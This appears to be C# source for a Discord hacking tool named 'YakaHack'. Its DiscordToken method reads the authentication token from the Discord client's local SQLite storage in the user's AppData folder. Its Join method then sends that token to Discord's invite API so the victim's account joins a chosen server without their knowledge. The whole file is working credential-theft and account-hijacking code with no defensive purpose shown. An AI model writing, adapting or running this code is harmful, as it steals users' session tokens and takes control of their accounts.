using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace YakaHack
{
    class JoinServer
    {
        public static void Join(string serverID)
        {
            HttpWebRequest discordRequest = (HttpWebRequest)WebRequest.Create($"https://discordapp.com/api/v6/invite/{serverID}");
            discordRequest.Method = "POST";
            discordRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0";
            discordRequest.AutomaticDecompression = DecompressionMethods.GZip;
            discordRequest.Headers.Add("Authorization", DiscordToken());
            discordRequest.ContentLength = 0;
            var response = (HttpWebResponse)discordRequest.GetResponse();
        }

        static string DiscordToken()
        {
            string file = $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\discord\\Local Storage\\https_discordapp.com_0.localstorage";
            StringBuilder remControlChar = new StringBuilder(256);

            using (SQLiteConnection conn = new SQLiteConnection($"data source={file}"))
            {
                using (SQLiteCommand comm = new SQLiteCommand("SELECT key, value FROM ItemTable", conn))
                {
                    conn.Open();

                    SQLiteDataReader reader = comm.ExecuteReader();

                    while (reader.Read())
                    {
                        if ((string)reader["Key"] == "token")
                        {
                            string tokenReturn = Encoding.Default.GetString((byte[])reader["Value"]).Replace('\"', ' ');
                            char singleCharacter;

                            for (int i = 0; i < tokenReturn.Length; i++)
                            {
                                singleCharacter = tokenReturn[i];
                                if (!char.IsControl(singleCharacter))
                                {
                                    remControlChar.Append(singleCharacter);
                                }
                            }
                        }
                    }
                    reader.Close();
                    conn.Close();
                }
            }

            return $"{remControlChar}";
        }
    }
}
